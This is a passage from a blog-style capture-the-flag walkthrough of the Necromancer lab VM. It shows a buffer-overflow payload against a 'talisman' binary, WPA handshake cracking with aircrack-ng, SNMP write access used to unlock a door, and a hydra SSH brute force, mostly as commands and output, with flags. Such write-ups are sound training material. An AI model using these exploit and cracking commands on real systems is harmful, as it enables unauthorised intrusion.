</span><span class='line'>Nothing happens.
</span><span class='line'>Segmentation fault</span></code></pre></td></tr></table></div></figure>
Utilizing ulimit -c unlimited, pattern_create and pattern_offset to create a core dump and find the offset
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ulimit -c unlimited
</span><span class='line'>
</span><span class='line'>usr/share/metasploit-framework/ruby /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200 | ./talisman
</span><span class='line'>You have found a talisman.
</span><span class='line'>
</span><span class='line'>The talisman is cold to the touch, and has no words or symbols on it&rsquo;s surface.
</span><span class='line'>
</span><span class='line'>Do you want to wear the talisman?<br/>
</span><span class='line'>Nothing happens.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Segmentation fault (core dumped)</span></code></pre></td></tr></table></div></figure>
Using gdb to find the offset
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb -c core -q
</span><span class='line'>[New LWP 6619]
</span><span class='line'>Core was generated by `./talisman'.
</span><span class='line'>Program terminated with signal SIGSEGV, Segmentation fault.
</span><span class='line'>#0  0x31624130 in ?? ()
</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>
Utilizing pattern_offset to find the offset
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/usr/share/metasploit-framework/ruby /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x31624130
</span><span class='line'>[*] Exact match at offset 32</span></code></pre></td></tr></table></div></figure></p>

<p>This could be confirmed by python &lsquo;A&rsquo; * 32 + &ldquo;BBBB&rdquo;.</p>

<p>using GDB to view all the functions
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) info functions
</span><span class='line'>All defined functions:
</span><span class='line'>
</span><span class='line'>Non-debugging symbols:
</span><span class='line'>0x080482d0  <em>init
</span><span class='line'>0x08048310  printf@plt
</span><span class='line'>0x08048320  <strong>libc_start_main@plt
</span><span class='line'>0x08048330  </strong>isoc99_scanf@plt
</span><span class='line'>0x08048350  </em>start
</span><span class='line'>0x08048380  <strong>x86.get_pc_thunk.bx
</span><span class='line'>0x08048390  deregister_tm_clones
</span><span class='line'>0x080483c0  register_tm_clones
</span><span class='line'>0x08048400  </strong>do_global_dtors_aux
</span><span class='line'>0x08048420  frame_dummy
</span><span class='line'>0x0804844b  unhide
</span><span class='line'>0x0804849d  hide
</span><span class='line'>0x080484f4  myPrintf
</span><span class='line'>0x08048529  wearTalisman
</span><span class='line'>0x08048a13  main
</span><span class='line'>0x08048a37  chantToBreakSpell
</span><span class='line'>0x08049530  <strong>libc_csu_init
</span><span class='line'>0x08049590  </strong>libc_csu_fini
</span><span class='line'>0x08049594  _fini</span></code></pre></td></tr></table></div></figure>
chantToBreakSpell seems interesting. Let&rsquo;s put the address of that function in the overflow pointer.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -c &lsquo;print &ldquo;A&rdquo;<em>32 + &ldquo;\x37\x8a\x04\x08&rdquo;&rsquo; | ./talisman
</span><span class='line'>You have found a talisman.
</span><span class='line'>
</span><span class='line'>The talisman is cold to the touch, and has no words or symbols on it&rsquo;s surface.
</span><span class='line'>
</span><span class='line'>Do you want to wear the talisman?<br/>
</span><span class='line'>Nothing happens.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
</span><span class='line'>You fall to your knees.. weak and weary.
</span><span class='line'>Looking up you can see the spell is still protecting the cave entrance.
</span><span class='line'>The talisman is now almost too hot to touch!
</span><span class='line'>Turning it over you see words now etched into the surface:
</span><span class='line'>flag4{ea50536158db50247e110a6c89fcf3d3}
</span><span class='line'>Chant these words at u31337
</span><span class='line'>!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
</span><span class='line'>Segmentation fault (core dumped)</span></code></pre></td></tr></table></div></figure>
It suggests to connect to udp port 31337 and chant the words
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -u 192.168.56.101 31337
</span><span class='line'>
</span><span class='line'>Nothing happens.
</span><span class='line'>blackmagic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>As you chant the words, a hissing sound echoes from the ice walls.
</span><span class='line'>
</span><span class='line'>The blue aura disappears from the cave entrance.
</span><span class='line'>
</span><span class='line'>You enter the cave and see that it is dimly lit by torches; shadows dancing against the rock wall as you descend deeper and deeper into the mountain.
</span><span class='line'>
</span><span class='line'>You hear high pitched screeches coming from within the cave, and you start to feel a gentle breeze.
</span><span class='line'>
</span><span class='line'>The screeches are getting closer, and with it the breeze begins to turn into an ice cold wind.
</span><span class='line'>
</span><span class='line'>Suddenly, you are attacked by a swarm of bats!
</span><span class='line'>
</span><span class='line'>You aimlessly thrash at the air in front of you!
</span><span class='line'>
</span><span class='line'>The bats continue their relentless attack, until&hellip;. silence.
</span><span class='line'>
</span><span class='line'>Looking around you see no sign of any bats, and no indication of the struggle which had just occurred.
</span><span class='line'>
</span><span class='line'>Looking towards one of the torches, you see something on the cave wall.
</span><span class='line'>
</span><span class='line'>You walk closer, and notice a pile of mutilated bats lying on the cave floor.  Above them, a word etched in blood on the wall.
</span><span class='line'>
</span><span class='line'>/thenecromancerwillabsorbyoursoul
</span><span class='line'>
</span><span class='line'>flag5{0766c36577af58e15545f099a3b15e60}
</span></code></pre></td></tr></table></div></figure>
It provides another webpage link with a story and
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>flag6{b1c3ed8f1db4258e4dcb0ce565f6dc03}
</span><span class='line'>
</span><span class='line'>You continue to make your way through the cave.
</span><span class='line'>
</span><span class='line'>In the distance you can see a familiar flicker of light moving in and out of the shadows.
</span><span class='line'>
</span><span class='line'>As you get closer to the light you can hear faint footsteps, followed by the sound of a heavy door opening.
</span><span class='line'>
</span><span class='line'>You move closer, and then stop frozen with fear.
</span><span class='line'>
</span><span class='line'>It&rsquo;s the necromancer!
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Image copyright: Manzanedo
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Again he stares at you with deathly hollow eyes.
</span><span class='line'>
</span><span class='line'>He is standing in a doorway; a staff in one hand, and an object in the other.
</span><span class='line'>
</span><span class='line'>Smirking, the necromancer holds the staff and the object in the air.
</span><span class='line'>
</span><span class='line'>He points his staff in your direction, and the stench of death and decay begins to fill the air.
</span><span class='line'>
</span><span class='line'>You stare into his eyes and then&hellip;&hellip;.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&hellip;&hellip; darkness. You open your eyes and find yourself lying on the damp floor of the cave.
</span><span class='line'>
</span><span class='line'>The amulet must have saved you from whatever spell the necromancer had cast.
</span><span class='line'>
</span><span class='line'>You stand to your feet. Behind you, only darkness.
</span><span class='line'>
</span><span class='line'>Before you, a large door with the symbol of a skull engraved into the surface.
</span><span class='line'>
</span><span class='line'>Looking closer at the skull, you can see u161 engraved into the forehead.</span></code></pre></td></tr></table></div></figure>
Running file
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>file necromancer
</span><span class='line'>necromancer: bzip2 compressed data, block size = 900k
</span><span class='line'>
</span><span class='line'>tar -jxvf necromancer
</span><span class='line'>necromancer.cap
</span><span class='line'>
</span><span class='line'>file necromancer.cap
</span><span class='line'>necromancer.cap: tcpdump capture file (little-endian) - version 2.4 (802.11, capture length 65535)</span></code></pre></td></tr></table></div></figure>
Opening the necromancer.cap file, we find Authentication, Deauthentication and EAPOL data, which is similar to the packet capture when trying to do WPA-handshake capture, while trying to deauthenticate the valid user.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>13:06:21.922176 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
</span><span class='line'>13:06:21.922688 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
</span><span class='line'>13:06:21.923157 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown)
</span><span class='line'>13:06:21.924224 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station
</span><span class='line'>13:06:21.924736 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station
</span><span class='line'>13:06:21.925723 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown)
</span><span class='line'>13:06:21.933402 Probe Response (community) [1.0</em> 2.0<em> 5.5</em> 11.0<em> 18.0 24.0 36.0 54.0 Mbit] CH: 11, PRIVACY
</span><span class='line'>13:06:21.933908 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown)
</span><span class='line'>13:06:21.934427 Clear-To-Send RA:e0:3e:44:04:52:75 (oui Unknown)
</span><span class='line'>13:06:21.991250 Authentication (Open System)-1: Successful
</span><span class='line'>13:06:21.992274 Authentication (Open System)-1: Successful
</span><span class='line'>13:06:21.992282 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown)
</span><span class='line'>13:06:21.992795 Authentication (Open System)-2:
</span><span class='line'>13:06:21.992787 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown)
</span><span class='line'>13:06:21.994834 Assoc Request (community) [1.0</em> 2.0<em> 5.5</em> 11.0* 18.0 24.0 36.0 54.0 Mbit]
</span><span class='line'>13:06:21.994843 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown)
</span><span class='line'>13:06:21.996890 Assoc Response AID(1) : PRIVACY : Successful
</span><span class='line'>13:06:21.996882 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown)
</span><span class='line'>13:06:22.011783 Action (e8:50:8b:20:52:75 (oui Unknown)): BA ADDBA Response
</span><span class='line'>13:06:22.012314 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown)
</span><span class='line'>13:06:22.012827 BAR RA:e8:50:8b:20:52:75 (oui Unknown) TA:c4:12:f5:0d:5e:95 (oui Unknown) CTL(4) SEQ(0)
</span><span class='line'>13:06:22.013330 BA RA:c4:12:f5:0d:5e:95 (oui Unknown)
</span><span class='line'>13:06:22.014874 CF +QoS EAPOL key (3) v2, len 117
</span><span class='line'>13:06:22.015379 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown)
</span><span class='line'>13:06:22.030226 CF +QoS EAPOL key (3) v1, len 117
</span><span class='line'>13:06:22.030746 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown)
</span><span class='line'>13:06:22.043034 CF +QoS EAPOL key (3) v2, len 175
</span><span class='line'>13:06:22.043026 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown)
</span><span class='line'>13:06:22.054803 CF +QoS EAPOL key (3) v1, len 95
</span><span class='line'>13:06:22.056338 CF +QoS EAPOL key (3) v1, len 95
</span><span class='line'>13:06:22.056859 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown)
</span><span class='line'>13:06:22.064514 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown)
</span><span class='line'>13:06:22.065030 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown)
</span><span class='line'>13:06:22.079878 Clear-To-Send RA:18:f6:43:9c:dc:5f (oui Unknown)
</span><span class='line'>13:06:22.080901 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown)
</span><span class='line'>13:06:22.108096 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
</span><span class='line'>13:06:22.108096 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
</span><span class='line'>13:06:22.110144 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station
</span></code></pre></td></tr></table></div></figure></p>

<p>Aircrack-ng shows 1 WPA Handshake present
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ircrack-ng necromancer.cap
</span><span class='line'>Opening necromancer.cap
</span><span class='line'>Read 2197 packets.
</span><span class='line'>
</span><span class='line'>   #  BSSID              ESSID                     Encryption
</span><span class='line'>
</span><span class='line'>   1  C4:12:F5:0D:5E:95  community                 WPA (1 handshake)
</span><span class='line'>
</span><span class='line'>Choosing first network as target.
</span><span class='line'>
</span><span class='line'>Opening necromancer.cap
</span><span class='line'>Please specify a dictionary (option -w).
</span></code></pre></td></tr></table></div></figure>
Utilizing aircrack with rockyou provides the wpa key
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>                             Aircrack-ng 1.2 rc4
</span><span class='line'>
</span><span class='line'>  [00:00:09] 16092/9822768 keys tested (1749.59 k/s)
</span><span class='line'>
</span><span class='line'>  Time left: 1 hour, 33 minutes, 27 seconds                  0.16%
</span><span class='line'>
</span><span class='line'>                       KEY FOUND! [ death2all ]
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  Master Key     : 7C F8 5B 00 BC B6 AB ED B0 53 F9 94 2D 4D B7 AC
</span><span class='line'>                   DB FA 53 6F A9 ED D5 68 79 91 84 7B 7E 6E 0F E7
</span><span class='line'>
</span><span class='line'>  Transient Key  : EB 8E 29 CE 8F 13 71 29 AF FF 04 D7 98 4C 32 3C
</span><span class='line'>                   56 8E 6D 41 55 DD B7 E4 3C 65 9A 18 0B BE A3 B3
</span><span class='line'>                   C8 9D 7F EE 13 2D 94 3C 3F B7 27 6B 06 53 EB 92
</span><span class='line'>                   3B 10 A5 B0 FD 1B 10 D4 24 3C B9 D6 AC 23 D5 7D
</span><span class='line'>
</span><span class='line'>  EAPOL HMAC     : F6 E5 E2 12 67 F7 1D DC 08 2B 17 9C 72 42 71 8E </span></code></pre></td></tr></table></div></figure></p>

<p>If we read the message previously, it says, u161 is engraved into your forehead. Using snmpwalk to findout.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>snmp-check -t 192.168.56.101 -c death2all
</span><span class='line'>
</span><span class='line'> [<em>] System information
</span><span class='line'> &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;
</span><span class='line'>
</span><span class='line'> Hostname               : Fear the Necromancer!
</span><span class='line'> Description            : You stand in front of a door.
</span><span class='line'> Uptime system          : 0.00 seconds
</span><span class='line'> Uptime SNMP daemon     : 0.00 seconds
</span><span class='line'> Contact                : The door is Locked. If you choose to defeat me, the door must be Unlocked.
</span><span class='line'> Location               : Locked - death2allrw!
</span><span class='line'> Motd                   : -</span></code></pre></td></tr></table></div></figure>
Checking for write access with death2all and death2allrw
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>snmp-check -t 192.168.56.101 -c death2all -w
</span><span class='line'>snmpcheck v1.8 - SNMP enumerator
</span><span class='line'> [</em>] Try to connect to 192.168.56.101
</span><span class='line'> [<em>] Connected to 192.168.56.101
</span><span class='line'> [</em>] Starting enumeration at 2016-07-16 17:27:43
</span><span class='line'> [<em>] No write access enabled.
</span><span class='line'> [</em>] Checked 192.168.56.101 in 0.00 seconds
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>snmp-check -t 192.168.56.101 -c death2allrw -w
</span><span class='line'>snmpcheck v1.8 - SNMP enumerator
</span><span class='line'>Copyright &copy; 2005-2011 by Matteo Cantoni (www.nothink.org)
</span><span class='line'>
</span><span class='line'> [<em>] Try to connect to 192.168.56.101
</span><span class='line'> [</em>] Connected to 192.168.56.101
</span><span class='line'> [<em>] Starting enumeration at 2016-07-16 17:27:55
</span><span class='line'> [</em>] Write access enabled!
</span><span class='line'> [*] Checked 192.168.56.101 in 0.00 seconds</span></code></pre></td></tr></table></div></figure>
Write access is enabled, we can use snmpset
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>snmpwalk -c death2all -v 1 192.168.56.101
</span><span class='line'>iso.3.6.1.2.1.1.1.0 = STRING: &ldquo;You stand in front of a door.&rdquo;
</span><span class='line'>iso.3.6.1.2.1.1.4.0 = STRING: &ldquo;HASH(0x286cfd0)&rdquo;
</span><span class='line'>iso.3.6.1.2.1.1.5.0 = STRING: &ldquo;Fear the Necromancer!&rdquo;
</span><span class='line'>iso.3.6.1.2.1.1.6.0 = STRING: &ldquo;Locked - death2allrw!&rdquo;
</span><span class='line'>End of MIB</span></code></pre></td></tr></table></div></figure>
We need to change the iso.3.6.1.2.1.1.6.0 MIB from &ldquo;Locked - death2allrw!&rdquo; to &ldquo;Unlocked&rdquo;
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>snmpset -c death2allrw -v 1 192.168.56.101 iso.3.6.1.2.1.1.6.0 s &ldquo;Unlocked&rdquo;
</span><span class='line'>iso.3.6.1.2.1.1.6.0 = STRING: &ldquo;Unlocked&rdquo;</span></code></pre></td></tr></table></div></figure>
Running snmpwalk again with community string death2all
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>snmpwalk -c death2all -v 1 192.168.56.101
</span><span class='line'>iso.3.6.1.2.1.1.1.0 = STRING: &ldquo;You stand in front of a door.&rdquo;
</span><span class='line'>iso.3.6.1.2.1.1.4.0 = STRING: &ldquo;The door is unlocked! You may now enter the Necromancer&rsquo;s lair!&rdquo;
</span><span class='line'>iso.3.6.1.2.1.1.5.0 = STRING: &ldquo;Fear the Necromancer!&rdquo;
</span><span class='line'>iso.3.6.1.2.1.1.6.0 = STRING: &ldquo;flag7{9e5494108d10bbd5f9e7ae52239546c4} - t22&rdquo;</span></code></pre></td></tr></table></div></figure>
Checking the google for 9e5494108d10bbd5f9e7ae52239546c4 leads to demonslayer, combined with the hint of t22 which is tcp 22/ ssh. we try to login using hydra and rockyou dictionary.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hydra -l demonslayer -P /tmp/rockyou.txt ssh://192.168.56.101
</span><span class='line'>Hydra v8.2 &copy; 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
</span><span class='line'>
</span><span class='line'>Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) starting at 2016-07-16 17:38:09
</span><span class='line'>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
</span><span class='line'>[DATA] max 16 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~14008 tries per task
</span><span class='line'>[DATA] attacking service ssh on port 22
</span><span class='line'>[22][ssh] host: 192.168.56.101   login: demonslayer   password: 12345678
</span><span class='line'>1 of 1 target successfully completed, 1 valid password found
</span><span class='line'>Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) finished at 2016-07-16 17:38:12</span></code></pre></td></tr></table></div></figure>
It provides the password superfast.</p>

<p>Loggin in to view another flag
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ id
</span><span class='line'>uid=1000(demonslayer) gid=1000(demonslayer) groups=1000(demonslayer)
</span><span class='line'>$ ls
</span><span class='line'>flag8.txt
</span><span class='line'>$ cat flag8.txt                                                                                                                                                                                                               <br/>
</span><span class='line'>You enter the Necromancer&rsquo;s Lair!
</span><span class='line'>
</span><span class='line'>A stench of decay fills this place.<br/>
</span><span class='line'>
</span><span class='line'>Jars filled with parts of creatures litter the bookshelves.
</span><span class='line'>
</span><span class='line'>A fire with flames of green burns coldly in the distance.
</span><span class='line'>
</span><span class='line'>Standing in the middle of the room with his back to you is the Necromancer.<br/>
</span><span class='line'>
</span><span class='line'>In front of him lies a corpse, indistinguishable from any living creature you have seen before.
</span><span class='line'>
</span><span class='line'>He holds a staff in one hand, and the flickering object in the other.
</span><span class='line'>
</span><span class='line'>&ldquo;You are a fool to follow me here!  Do you not know who I am!&rdquo;
</span><span class='line'>
</span><span class='line'>The necromancer turns to face you.  Dark words fill the air!
</span><span class='line'>
</span><span class='line'>&ldquo;You are damned already my friend.  Now prepare for your own death!&rdquo;
</span><span class='line'>
